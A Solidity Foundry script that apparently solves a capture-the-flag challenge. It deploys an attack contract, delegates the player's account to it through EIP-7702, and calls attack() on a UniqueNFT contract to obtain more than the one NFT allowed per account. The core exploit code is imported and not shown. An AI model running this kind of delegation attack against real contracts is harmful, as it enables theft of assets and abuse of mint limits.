// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Script, console} from "forge-std/Script.sol";
import {UniqueNFT} from "./UniqueNFT.sol";
import {UniqueNFTAttack} from "./UniqueNFTAttack.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

address constant UNIQUE_NFT_ADDR = 0xD0AB2Ad11736e1d087fa50b5B63f068CEfC29b7E;

contract DeployUniqueNFTAttack is Script {
    function run() public returns (address retAddr) {
        vm.startBroadcast();
        retAddr = address(new UniqueNFTAttack());
        vm.stopBroadcast();
    }
}

contract UniqueNFTScript is Script {
    function run() public {
        uint256 PLAYER_SK = vm.envUint("PLAYER_SK");
        address player = vm.addr(PLAYER_SK);
        console.log("player: %s", player);

        DeployUniqueNFTAttack deployScript = new DeployUniqueNFTAttack();
        address attackAddr = deployScript.run();

        vm.startBroadcast();
        _whoAmI();

        UniqueNFT uniqueNFT = UniqueNFT(UNIQUE_NFT_ADDR);

        vm.signAndAttachDelegation(attackAddr, PLAYER_SK);

        UniqueNFTAttack(player).attack(UNIQUE_NFT_ADDR);
        require(IERC721(UNIQUE_NFT_ADDR).balanceOf(player) > 1, "alice should have more than 1 NFT");

        vm.stopBroadcast();

        // Remove delegation
        vm.signAndAttachDelegation(address(0), PLAYER_SK);
        require(player.code.length == 0, "player is undelegated");
    }

    function _whoAmI() internal {
        (, address msgSender, address txOrigin) = vm.readCallers();
        console.log("msgSender: %s", msgSender);
        console.log("txOrigin: %s", txOrigin);
        console.log("balance: %s", msgSender.balance);
    }
}
